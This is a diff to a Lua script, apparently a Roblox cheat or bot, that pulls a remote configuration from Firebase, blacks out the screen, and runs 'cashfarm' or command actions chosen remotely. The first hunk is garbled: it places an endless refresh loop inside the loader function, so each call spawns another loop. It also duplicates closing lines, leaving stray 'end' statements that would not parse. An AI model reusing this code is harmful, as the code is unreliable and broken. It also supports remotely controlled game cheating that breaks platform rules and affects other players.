@@ -194,18 +194,32 @@ end
 
 -- BULLETPROOF Configuration Loader - ALWAYS works
 local function loadConfiguration()
+
+-- Periodically refresh configuration
+task.spawn(function()
+    while true do
+        pcall(loadConfiguration)
+        wait(30)
+    end
+end)
     pcall(function()
         local url = "https://omebgle-default-rtdb.firebaseio.com/config.json"
-        
         local response = bulletproofHttpRequest(url, "GET")
         if response and response ~= "null" then
             local data = game:GetService("HttpService"):JSONDecode(response)
             if data then
-                -- Update configuration with values from Firebase
                 for key, value in pairs(data) do
                     if _GLOBAL_CONFIG[key] ~= nil then
                         _GLOBAL_CONFIG[key] = value
                     end
+                end
+                print("Configuration loaded from Firebase")
+            end
+        else
+            print("Using default configuration")
+        end
+    end)
+end
                 end
                 print("Configuration loaded from Firebase")
             end
@@ -685,6 +699,14 @@ end
 -- Initial setup
 makeScreenBlack()
 loadConfiguration()
+
+-- Periodically refresh configuration
+task.spawn(function()
+    while true do
+        pcall(loadConfiguration)
+        wait(30)
+    end
+end)
 
 
 -- AUTO_EXECUTION_TRIGGER: execute auto actions based on remote config (only one will run; priority: cashfarm -> dhccommands -> custom)
